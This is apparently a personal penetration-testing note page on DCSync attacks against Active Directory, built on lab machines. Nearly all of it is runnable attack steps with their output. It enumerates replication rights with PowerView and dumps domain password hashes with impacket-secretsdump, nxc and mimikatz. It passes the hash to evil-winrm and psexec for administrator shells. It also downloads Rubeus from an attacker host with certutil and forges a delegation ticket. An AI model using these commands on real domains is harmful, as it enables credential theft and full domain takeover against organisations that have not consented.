---
publish: true
created: 2026-01-24T16:14:55.893+05:30
modified: 2026-06-21T20:10:03.328+05:30
---

run with shell of DCsync privileges account or higher group accounts

Key Rights to Look For:

To perform a DCSync attack, an account must have the following rights on the Domain Object: 

- **DS-Replication-Get-Changes** (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
- **DS-Replication-Get-Changes-All** (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)
- **DS-Replication-Get-Changes-In-Filtered-Set** (`89e95b76-444d-4c62-991a-0facbeda640c`)
  Enumeration
  load [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) - then

```powershell
Get-ObjectAcl -DistinguishedName "dc=yourdomain,dc=com" -ResolveGUIDs | ? {($_.IdentityReference -match "your-username") -and ($_.ActiveDirectoryRights -match "ExtendedRight")}
```

## User Account

if you have accounts credentials you can dump NTDS.DIT.

### impacket

```
$ impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!'@10.129.95.180
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[SNIP]
```

you can pass the NTLM hash and get shell with evil-winrm

```
$ evil-winrm -i SAUNA -u administrator -H '823452073d75b9d1cf70ebdf86c7f98e'

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
9e563160dd3936287c23c38ce553ead6
```

### nxc

- via nxc

```bash
nxc smb $IP -u Administrator -H 'hash' -ntds --user domadmin
```

### mimikatz

- via mimi (always run `privilege::debug` before executing anything)

```powershell
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:domadmin
```

```powershell
sadump::dcsync /dc:$DomainController /domain:$DOMAIN /all /csv
```

## System account

Example - "iis apppool\defaultapppool".

we will upload Rubeus and do _tgtdeleg_ for DCSync.

```
PS C:\temp> certutil.exe -f -urlcache -split http://10.10.14.53:81/Rubeus.exe

PS C:\temp> .\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe tgtdeleg /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: /zrA4Cy2osYUuYT0w3EE1OK5oMALuf2M8Xz+37I7Cpo=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIEClHgbpswdrMi4A6dGo62vWiZpucDbOSOUHNeT5b0PwGvoOkjkNvWYncVvGdjHEKDRaOISWobwATzOfs1g64TLzrFJvXp5gsYvQKEqdRjY8QP03JidldHpyTauAB6/qBb+azJaFtulDGRR/qep/GvGpyG8ZQzwPmdVPXGslLIyudlPJe+cc+3mm5/AmX3fDOAwMQ3NOe/eAy/hGalTdRZ7aMvaj3Sxp36SylMi2ngD+pkm25L1kfLE8RkxJG2NhqpCjOxbopU1pNF0QNkpSLNJIl2+9hx4uL+WZORiz4N9hfAC5VfGRaCN4dI1um8l9LZCf7E4OIgbI2KwLqyO+H+CxoAKw6LgqXEhCCTkZomYVn+momQ06VrVig0ygC5EV4/v0+keKED17TvBq7veQMuHj5/Vvgn20cvr4efu4K07M/qAt7xOYBV6bXFOAu1DIbop4dyc07wBxsv9YO3PpR82nwo0nVgCVwgtGjyRi4Qw3AqzxgNyLa7yzybF9t9xrsQjRGuOfdBK2KqngkeSvMbg6eheJ/kSFD+6LJGVn94JZRCt4z/NRiyAYcwnREqOXx3NFRqpjEsOgH/1xU0Njc5PqarUf18XQkSyjR2XESU/kgMGXVt1V/2H7qfF6/C23tWTSqjDC4W1mbhLPLpDlq5rkbN3JjZlPKAe4eUq/GvQ2TqoX/3kmK3+1XYx2YGrNw1jEiL4F8tZfz0EzxyooSTlA0idCWhwOQaz9BItwPHh2ebgqb0UCDVSc5v66E+kf/k2adgNad4VpOBDb83lDvwtmcSlmLhxs9I2wajY+L5BLsv2UYVuETpyqnb/B24SM6126C5/QNL5fYjowAYTObRmEdrWY3W9WVHMKrcHq0vMhO6abbV00q5ETbmUlPVcOtp/Lvc6QoTj9KiXkagO0LWimjygHwDQ+ZZn5vEpdKfCmhjgoX7TS7YYKzQ5o3PeNaJxFixCErO9mVMds1EqF8LjhYLnS9tg3Ni1bg6lGFMu6mmcKiVmZgN/wCRWI881GAVMfxKwUEM3RWs7ZMk1HrMmSshxo/D1LsIY/dCEsaosEXvbVKr/a2xn1+EPWCCO97ffaEXMXBp13PM42Jz2h4gJUNDDI45Y66tL8GXbunJLiisYtP9tv4bdGrcaK/UpfnfFrgmEgcMepVfDF8uLGnA8vTFULdQisbtgVw6orqdFYr5BoGh+rUlquAwG0PvM7ejZLsB/95WZxXR+7QBO88ScaauLeBKqkowmhUh19hJiz754mrsgS4O9kzeXgWSXn7AYbXPpxmH3HpUJ5Iwub12G73WM1QWuFESzBbPU8bOXZVP3mMBDGi4HctjRDtedsnQf4yiT9sabmeLMVsuQ9ptH1gxwMYIi1iimdg9o4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgCMmEv8N9ih8wz2QJgWVO23uWwGiuVgttLplID6WRTcqhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI2MDMwNTEyMTIxNlqmERgPMjAyNjAzMDUyMjEyMTZapxEYDzIwMjYwMzEyMTIxMjE2WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```

save this as `ticket.kirbi`. This is base64 encoded. so decode it for use.

```
$ base64 -d ticket.kirbi.b64 > ticket.kirbi
```

convert this ticket.kirbi to ticket.ccache

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

if the machine is too skewed, correct it.

```
sudo ntpdate flight.htb
```

now use the ticket.ccache to dump NTDS.DIT

```
$ KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass g0.flight.htb                                           
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
{SNIP}
```

check the privileges with _nxc_ and hash.

```
$ nxc smb flight.htb -u 'administrator' -H '43bbfc530bab76141b12c8446e30c17c' --shares --smb-timeout 10
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\administrator:43bbfc530bab76141b12c8446e30c17c (Pwn3d!)
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$          READ,WRITE      Remote Admin
SMB         10.129.228.120  445    G0               C$              READ,WRITE      Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ,WRITE      Logon server share
SMB         10.129.228.120  445    G0               Shared          READ
SMB         10.129.228.120  445    G0               SYSVOL          READ,WRITE      Logon server share
SMB         10.129.228.120  445    G0               Users           READ
SMB         10.129.228.120  445    G0               Web             READ
```

you have write access as administrator over some shares. use can use psexec with hashes for shell.

```
$ impacket-psexec administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c

# print root.txt for flag.
```
